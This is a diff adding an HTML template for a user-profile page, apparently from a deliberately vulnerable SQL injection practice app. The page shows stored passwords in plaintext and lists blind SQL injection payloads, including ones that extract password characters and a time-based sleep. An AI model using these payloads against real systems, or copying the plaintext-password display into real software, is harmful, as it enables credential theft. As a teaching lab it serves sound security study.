@@ -1,0 +1,48 @@
+<div class="profile-container">
+    <h2>User Profile</h2>
+    
+    {{#if error}}
+    <div class="error-message">
+        {{error}}
+    </div>
+    {{/if}}
+    
+    <div class="profile-form">
+        <form action="/profile" method="GET">
+            <div class="form-group">
+                <label for="id">User ID:</label>
+                <input type="text" id="id" name="id" value="{{user.id}}" placeholder="Enter user ID">
+                <button type="submit" class="btn-profile">View Profile</button>
+            </div>
+        </form>
+    </div>
+    
+    {{#if user}}
+    <div class="profile-info">
+        <h3>Profile Information</h3>
+        <div class="profile-details">
+            <p><strong>ID:</strong> {{user.id}}</p>
+            <p><strong>Username:</strong> {{user.username}}</p>
+            <p><strong>Password:</strong> {{user.password}} ({{user.passwordLength}} characters)</p>
+        </div>
+    </div>
+    {{/if}}
+    
+    <div class="sqli-examples">
+        <h3>Blind SQL Injection Examples:</h3>
+        <p>Try these blind SQLi payloads in the User ID field:</p>
+        <ul>
+            <li><code>1 AND 1=1</code> - Returns data (true condition)</li>
+            <li><code>1 AND 1=2</code> - Returns no data (false condition)</li>
+            <li><code>1 AND (SELECT CASE WHEN (username='admin') THEN 1 ELSE 0 END FROM users WHERE id=1)=1</code> - Tests if user 1 is 'admin'</li>
+            <li><code>1 AND (SELECT CASE WHEN (substr(password,1,1)='a') THEN 1 ELSE 0 END FROM users WHERE id=1)=1</code> - Tests if first character of password is 'a'</li>
+            <li><code>1; SELECT CASE WHEN (1=1) THEN sqlite3_sleep(2000) ELSE sqlite3_sleep(0) END --</code> - Time-based blind injection</li>
+        </ul>
+        <p class="warning">Note: The time-based sleep example may cause the application to hang briefly if successful.</p>
+    </div>
+    
+    <div class="navigation">
+        <a href="/" class="btn-secondary">Back to Dashboard</a>
+        <a href="/logout" class="btn-logout">Logout</a>
+    </div>
+</div>
